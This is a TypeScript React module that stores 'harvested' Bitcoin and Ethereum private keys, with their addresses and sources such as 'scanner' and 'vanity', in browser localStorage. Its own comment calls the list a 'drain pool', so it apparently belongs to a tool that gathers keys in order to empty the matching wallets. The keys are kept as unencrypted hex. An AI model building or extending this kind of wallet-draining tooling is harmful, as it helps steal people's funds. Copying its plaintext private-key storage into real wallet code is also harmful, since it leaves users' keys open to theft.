import { useEffect, useState } from 'react';
import type { WalletAccount, BtcAddrType } from '@/hooks/useWallet';

const HARVEST_KEY = 'ckg_harvested_keys_v1';
const MAX_KEEP = 5000;

export type HarvestSource = 'vanity' | 'scanner' | 'dune' | 'manual';

export interface HarvestedKey extends WalletAccount {
  source: HarvestSource;
  addedAt: number;
}

let cache: HarvestedKey[] | null = null;
const listeners = new Set<(list: HarvestedKey[]) => void>();

function read(): HarvestedKey[] {
  if (cache) return cache;
  try {
    const raw = localStorage.getItem(HARVEST_KEY);
    const list = raw ? JSON.parse(raw) : [];
    cache = Array.isArray(list) ? list.filter((k: any) => k?.address && k?.privHex) : [];
  } catch {
    cache = [];
  }
  return cache!;
}

function write(list: HarvestedKey[]) {
  cache = list;
  try {
    localStorage.setItem(HARVEST_KEY, JSON.stringify(list));
  } catch { /* storage unavailable */ }
  listeners.forEach(fn => fn(list));
}

export function getHarvested(): HarvestedKey[] {
  return read();
}

/** Add generated/scanned keys to the drain pool. Deduped by address. */
export function harvestKeys(
  entries: Array<{
    address: string;
    privateKey: string;
    network: 'btc' | 'eth';
    addressType?: string;
  }>,
  source: HarvestSource,
) {
  if (!entries.length) return;
  const current = read();
  const seen = new Set(current.map(k => k.address));
  const additions: HarvestedKey[] = [];

  for (const e of entries) {
    if (!e?.address || !e?.privateKey || seen.has(e.address)) continue;
    seen.add(e.address);
    additions.push({
      network: e.network,
      addrType: e.network === 'btc' ? ((e.addressType as BtcAddrType) || 'p2pkh') : undefined,
      address: e.address,
      privHex: e.privateKey.replace(/^0x/, ''),
      source,
      addedAt: Date.now(),
    });
  }

  if (!additions.length) return;
  write([...additions, ...current].slice(0, MAX_KEEP));
}

export function clearHarvested() {
  write([]);
}

export function removeHarvested(address: string) {
  write(read().filter(k => k.address !== address));
}

export function useHarvestedKeys(): HarvestedKey[] {
  const [list, setList] = useState<HarvestedKey[]>(() => read());
  useEffect(() => {
    const fn = (l: HarvestedKey[]) => setList(l);
    listeners.add(fn);
    setList(read());
    return () => { listeners.delete(fn); };
  }, []);
  return list;
}
